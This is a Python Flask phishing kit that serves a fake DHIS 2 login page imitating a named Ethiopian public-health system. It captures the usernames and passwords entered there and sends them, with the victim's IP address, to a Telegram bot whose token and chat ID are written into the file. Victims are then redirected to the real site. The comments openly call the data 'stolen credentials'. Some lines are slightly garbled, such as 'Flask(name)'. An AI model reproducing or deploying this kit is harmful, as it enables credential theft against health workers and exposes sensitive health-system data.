import requests
from flask import Flask, request, render_template_string, redirect
import datetime
import os 

# === CONFIGURATION ===
# CRITICAL: These should be set as Environment Variables on the Render dashboard!
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8852974803:AAHgxTtXsIxJhG4N5z_XYGyQTeOLLIm-Ylw')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '7586408670')
TARGET_DHIS_URL = "https://tbh.ephi.gov.et/"
# ========================

app = Flask(name)

def send_to_telegram(text):
    """Sends stolen credentials to your Telegram via API."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': text, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
    try:
        # Using requests.post immediately triggers the execution path
        requests.post(url, json=payload, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"Telegram Error: {e}")

# --- HTML TEMPLATE ---
HTML_TEMPLATE = """
&amp;lt;!DOCTYPE HTML&amp;gt;
&amp;lt;html class="loginPage" dir="ltr"&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;DHIS 2&amp;lt;/title&amp;gt;
    &amp;lt;script src="https://code.jquery.com/jquery-3.6.3.min.js"&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;style&amp;gt;
        /* Minimal CSS */
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f5f5f5; }
        .button { width: 100%; padding: 12px; background-color: #0066cc; color: #fff; }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body class="loginPage" dir="ltr"&amp;gt;
    &amp;lt;div id="loginArea"&amp;gt;
        &amp;lt;form id="loginForm" action="/capture" method="post"&amp;gt;
            &amp;lt;div class="form-group"&amp;gt;&amp;lt;input type="text" id="j_username" name="j_username" required autofocus&amp;gt;&amp;lt;/div&amp;gt;
            &amp;lt;div class="form-group"&amp;gt;&amp;lt;input type="password" id="j_password" name="j_password" required&amp;gt;&amp;lt;/div&amp;gt;
            &amp;lt;div id="submitDiv"&amp;gt;&amp;lt;input id="submit" class="button" type="submit" value="Sign in"&amp;gt;&amp;lt;/div&amp;gt;
        &amp;lt;/form&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
"""
# -----------------------------------------

@app.route('/', methods=['GET'])
def index():
    # This route serves the page content
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    # This route intercepts the credentials
    username = request.form.get('j_username')
    password = request.form.get('j_password')

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Log to Telegram
    telegram_msg = f"""
&amp;lt;b&amp;gt;DHIS 2 Phish Captured&amp;lt;/b&amp;gt;
Time: {timestamp}
IP: {request.remote_addr}
User: {username or '[Empty]'}
Pass: {password or '[Empty]'}
    """
    send_to_telegram(telegram_msg)

    # Immediate redirection to the target
    return redirect(TARGET_DHIS_URL)

if name == 'main':
    app.run(debug=True, host='0.0.0.0', port=80)
